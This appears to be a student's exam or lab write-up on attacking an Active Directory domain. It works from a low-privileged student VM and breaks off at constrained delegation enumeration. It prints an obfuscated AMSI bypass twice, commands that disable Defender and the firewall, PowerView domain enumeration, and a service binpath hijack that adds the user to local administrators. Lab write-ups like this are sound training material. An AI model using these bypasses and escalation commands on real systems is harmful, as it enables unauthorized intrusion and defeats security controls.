## Enumeration StudentVM
**Domain Enumeration:**
I started the exam from the student VM machine which is lower privileged account on the current domain:
I have opened the powershell but not able to bypass the defender and not able to turn off the firewall. I 
have done an AMSI bypass and started with the enumeration further on the foothold Machine.
```
AMSI BYPASS:
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; (
Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}"
-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( (
"{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' 
))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
For the initial enumeration of the foothold machine the first I use Powerup.ps1 is a PowerShell script that 
can be used to check and enhance the security of a system running PowerShell also Powerup.ps1 also 
provides additional features, such as checks for possible privilege escalation and attempts to elevate the 
current user's privileges by trying various known techniques.
```
. .\PowerUp.ps1
```
I will perform a series of checks to identify potential security issues
```
Invoke-AllChecks
```
I perform potential security issues, there is any AbuseFunction.
```
Invoke-ServiceAbuse –Name ‘vds’ –Username tech\studentuser
```
Set-MpPreference is a cmdlet (command-let) in PowerShell that can be used to configure various 
preferences in the Microsoft Defender antivirus software. The -DisableIOAVProtection parameter is used 
to disable real-time protection against potentially malicious code injection and modification of certain 
system processes, also known as "IOAV protection, also -DisableIRealtimeMonitoring parameter is used 
to disable real-time protection against potentially malicious software and other threats."
```
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIRealtimeMonitoring $true
```
For the initial enumeration of the foothold machine here I have used the powerview_dev.ps1 to get all 
the information about the domain and hosts.
```
. .\PowerView_dev.ps1
```
Enumerating users for the Domain Controller, also selecting specific property ‘cn’ from the full data of the 
users.
```
Get-NetUser | select cn
```
For enumerating the list of computers with the dnshostname in the current domain :
```
Get-NetComputer | Select cn
Get-NetComputer | Select dnshostname
```
For getting the information about the Domain Controller
```
Get-DomainController
```
For getting the Domain trusts information for the current domain.
```
Get-DomainTrust
```
Get full data of the forest domain and Domain Controllers in the current Domain.
```
Get-NetForestDomain
```
Checking the Domain groups for the current Domain Controller and specifically checking the group 
identity for the “Domain Admins”
Enumerating Domain groups and its members for the current DC
```
Get-DomainGroup –Identity "Domain Admins"
Get-DomainGroupMember –Identity "Domain Admins"
```
Enumerating the groups in the Domain Controller
```
Get-NetGroup
Get-NetGroup | select cn
```
**Enumerating ACLS:**
ACLs: It is the list of the access control entries.
To enumerate ACLs, we can use Get-ObjectACL and Get-DomainObjectACL from PowerView like below
```
Get-DomainObjectAcl –Identity “Domain Admins” –ResolveGUIDs -Verbose
```
Enumerate shares and sessions on Domain.
```
Get-NetShare
Get-NetSession
```
Enumerating all the GPO’s for the given Domain
```
Get-NetGPO
```
Enumerating Domain Policy which can help by revealing the information about password policy and 
Kerberos password policy
```
Get-DomainPolicy
```
## Privilege Escalation
So here I tried the PrivescCheck , which is a script for enumerating the privilege escalation in the windows. 
It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other 
users or to access local apps
I uploaded this in the foothold machine and run the commands:
Running the script using dot outsourcing.
```
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```
Using the above script, I was able to find the abusable executable vds which were having the 
misconfigured permissions, their permission was set to AccessAll. Also the other attribute which was 
showing that machine which is studentvm can be restarted which was set to true.

By abusing the service permission I can add my studentuser to the local group administrator.
For escalating privileges using the executable service control, I can change the binary path to add the 
studentuser in the local administrator group.
```
sc.exe config vds binpath= "C:\WINDOWS\System32\cmd.exe /c net localgroup administrators 
studentuser /add"
sc.exe qc vds
```
I finally got the local admin access “system32” shell. And I was the local admin in the foothold machine.
As in the above image, it is clear that studentuser is added in the local administrator group.
Now, I started the new powershell window in which I choose “run as administrator” and disable the 
firewall, Defender and AMSI.
#### Bypasses:
**Powershell Execution policy bypass :**
```
powershell -ep bypass
```
**Antivirus Bypass:**
```
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -
DisableIOAVProtection $true
```
**Firewall Bypass:**
```
Netsh Advfirewall set allprofiles state off
```
**AMSI Bypass:**
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; (
Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}"
-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( (
"{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' 
))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
Now for the further enumeration in the Domain Controller, I tried for enumerating for the different 
hostnames so I choose to enumerate for the dbserver31 which was looking maybe sql server is running 
on this host and I was not able to access the server as I was not having Administrator access. So I kept it 
for later stages. 
In student VM I was trying to enumerate for the attack path and was searching for some hints for the 
next steps.I have to try the enumeration for the Constrained delegation in the current Domain 
controller.
Loaded the PowerView and run the command for the constrained delegation.
```
. .\PowerView_dev.ps1
Get-DomainComputer -TrustedToAuth
```
 
